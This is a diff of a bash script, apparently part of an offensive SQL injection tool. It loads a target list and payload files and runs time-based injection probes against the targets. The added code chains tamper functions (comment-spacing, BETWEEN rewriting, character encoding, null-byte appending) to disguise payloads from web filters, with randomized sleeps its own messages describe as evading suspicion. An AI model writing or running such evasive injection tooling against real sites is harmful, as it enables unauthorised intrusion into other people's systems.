@@ -4,7 +4,8 @@
 
 # Code version 2
 # I myself still wondering, why do i name this "risk".
-# Welp, sunshine and rainbow. For this file, me will make the variable good name! 
+# Welp, sunshine and rainbow. For this file, me will make the variable "chill now. (ig)
+
 echo ""
 echo -e "\e[0;33m[\e[0m!\e[0;33m]\e[0m You just toggle on risk mode.. So, as i promise, RISK MODE ACTIVE." 
 echo ""
@@ -14,6 +15,8 @@ Cupcake_pie="$(dirname "$0")/../data/targets.txt"
 Strawberry_pudding="$(dirname "$0")/../data/sqli.txt"
 Choco_muffin="$(dirname "$0")/../data/gentle.txt"
 ROOT_LOG_FILE="$(dirname "$0")/../Target.log"
+
+source "$(dirname "$0")/../tamper/hungry.sh"
 
 if [ ! -f "$Cupcake_pie" ] || [ ! -f "$Strawberry_pudding" ] || [ ! -f "$Choco_muffin" ]; then
     echo -e "\e[0;31m[\e[0m!\e[0;31m]\e[0m Database files are missing."
@@ -102,19 +105,25 @@ if [ "$risk_stage_success" = "false" ]; then
     echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Stage 1 failed to acquire 200 OK. Escalating to Time based."
     echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
     sleep 5
-    
+
     sqli_stage_success="false"
     shuf "$Strawberry_pudding" | while IFS= read -r sqli_payload || [ -n "$sqli_payload" ]; do
         [[ -z "$sqli_payload" || "$sqli_payload" =~ ^# ]] && continue
-        if time_audit_engine "$sqli_payload"; then
+        
+        lapis_satu=$(space2comment_engine "$sqli_payload") #Lol, i like lapis. Lapis is not that blu blu thing. Ah yk yk.
+        lapis_dua=$(between_engine "$lapis_satu") #Im proud eating lapis.
+        lapis_tiga=$(charencode_engine "$lapis_dua") #Zamn, lapis.
+        masked_payload=$(appendnullbyte_engine "$lapis_tiga") #"masked payload", i dont really like that name. Any suggestion to change it?
+        
+        if time_audit_engine "$masked_payload"; then
             sqli_stage_success="true"
         fi
         sleep $((5 + RANDOM % 4))
     done
-    
+
     if [ "$sqli_stage_success" = "false" ]; then
         echo -e "\n\e[0;31m[\e[0m!\e[0;31m]\e[0m Time based returned zero anomalies. Dropping gear to Gentle Mode."
-        
+
         shuf "$Choco_muffin" | while IFS= read -r gentle_word || [ -n "$gentle_word" ]; do
             [[ -z "$gentle_word" || "$gentle_word" =~ ^# ]] && continue
             gentle_probe_engine "$gentle_word"
